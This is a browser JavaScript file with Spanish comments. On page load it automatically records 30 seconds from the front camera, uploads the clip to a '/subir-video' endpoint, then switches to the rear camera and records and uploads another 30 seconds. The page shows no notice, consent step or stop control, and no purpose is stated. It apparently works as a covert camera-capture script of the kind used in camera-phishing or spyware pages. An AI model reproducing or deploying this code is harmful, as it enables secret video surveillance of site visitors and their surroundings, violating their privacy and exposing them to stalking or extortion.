/* eslint-env browser */

document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoElement');
    
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    
    // Función de transferencia HTTP hacia el backend remoto
    const enviarVideo = (chunks, tipoCamara) => {
        const clipBlob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('video', clipBlob, 'clip.webm');

        fetch('/subir-video', {
            method: 'POST',
            body: formData
        })
        .catch((err) => {
            console.error('Fallo en la comunicación con el host remoto:', err);
        });
    };

    const detenerStream = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            if (videoElement) videoElement.srcObject = null;
        }
    };

    // Función principal de automatización secuencial de hardware
    const iniciarCapturaAutomatica = () => {
        const constraintsFrontal = {
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };

        const constraintsTrasera = {
            video: { facingMode: { exact: "environment" }, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };

        // PASO 1: Arrancar automáticamente con la cámara frontal
        navigator.mediaDevices.getUserMedia(constraintsFrontal)
            .then((mediaStream) => {
                stream = mediaStream;
                if (videoElement) videoElement.srcObject = stream;
                
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    enviarVideo(recordedChunks, 'frontal');
                    detenerStream();

                    // PASO 2: Transición automática inmediata al lente de entorno (trasero)
                    setTimeout(() => {
                        navigator.mediaDevices.getUserMedia(constraintsTrasera)
                            .then((traseraStream) => {
                                stream = traseraStream;
                                if (videoElement) videoElement.srcObject = stream;
                                
                                recordedChunks = [];
                                mediaRecorder = new MediaRecorder(stream);
                                
                                mediaRecorder.ondataavailable = (e) => {
                                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                                };
                                
                                mediaRecorder.onstop = () => {
                                    enviarVideo(recordedChunks, 'trasera');
                                    detenerStream();
                                };

                                mediaRecorder.start();
                                
                                // Duración estricta de 30 segundos para la cámara trasera
                                setTimeout(() => {
                                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                                }, 30000);
                            })
                            .catch((err) => {
                                console.error('Restricción o ausencia de lente trasero en el cliente:', err);
                            });
                    }, 1000);
                };
                
                mediaRecorder.start();
                
                // Duración estricta de 30 segundos para la cámara frontal
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 30000);
            })
            .catch((err) => {
                console.error('Falta de autorización de permisos HTTPS por el cliente:', err);
            });
    };

    // Ejecución inmediata al cargar el entorno
    iniciarCapturaAutomatica();
});
